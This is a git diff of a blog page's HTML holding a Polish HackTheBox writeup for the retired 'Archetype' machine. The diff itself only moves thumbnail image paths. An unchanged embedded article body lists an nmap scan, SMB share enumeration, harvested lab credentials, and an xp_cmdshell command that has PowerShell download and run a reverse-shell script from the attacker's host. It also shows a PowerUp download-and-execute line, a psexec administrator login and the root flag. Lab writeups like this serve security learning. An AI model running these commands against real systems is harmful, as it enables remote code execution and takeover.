@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/archetype/" />
-<meta property="og:image" content="https://lavatann.github.io/Archetype.png" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Archetype.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-01-20T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-01-20T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Archetype.png" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Archetype.png" />
 <meta name="twitter:title" content="Archetype - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Nmap sudo nmap -sC -sV -oA nmap 10.10.10.27 Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021-07-18 17:32 CEST Nmap scan report for 10.10.10.27 Host is up (0.097s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM | ms-sql-ntlm-info: | Target_Name: ARCHETYPE | NetBIOS_Domain_Name: ARCHETYPE | NetBIOS_Computer_Name: ARCHETYPE | DNS_Domain_Name: Archetype | DNS_Computer_Name: Archetype |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2021-07-18T15:41:01 |_Not valid after: 2051-07-18T15:41:01 |_ssl-date: 2021-07-18T15:51:47+00:00; +18m42s from scanner time. Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h42m41s, deviation: 3h07m50s, median: 18m41s | ms-sql-info: | 10.10.10.27:1433: | Version: | name: Microsoft SQL Server 2017 RTM | number: 14.00.1000.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | smb-os-discovery: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3) | Computer name: Archetype | NetBIOS computer name: ARCHETYPE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-07-18T08:51:38-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-07-18T15:51:40 |_ start_date: N/A Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 18.18 seconds  Smbclient smbclient -N -L //10.10.10.27 smbclient //10.10.10.27/backups  Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;\nsql_svc:M3g4c0rp123\n mssqlclient.py python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27  Nasłuchiwanie na jednym oknie na porcie 9001\nxp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\\\"http://10.10.14.116/mini-reverse.ps1\\\") EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.235/mini-reverse.ps1\") | powershell -noprofile'  Powerup.ps1 powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.235/PowerUp.ps1');Invoke-AllChecks\" $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nZawartość pliku:\nnet.exe use T: [\\\\Archetype\\backups](file://Archetype/backups) /user:administrator MEGACORP_4dm1n!!\n psexec Logowanie za pomocą psexec\nimpacket-psexec administrator@10.10.10.27 root.txt\nb91ccec3305e98240082d4474b848528\n",
   "wordCount" : "322",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Archetype.png","datePublished": "2021-01-20T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Archetype.png","datePublished": "2021-01-20T00:00:00Z",
   "dateModified": "2021-01-20T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Archetype.png" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Archetype.png" alt="">
         
 </figure><div class="toc">
     <details >
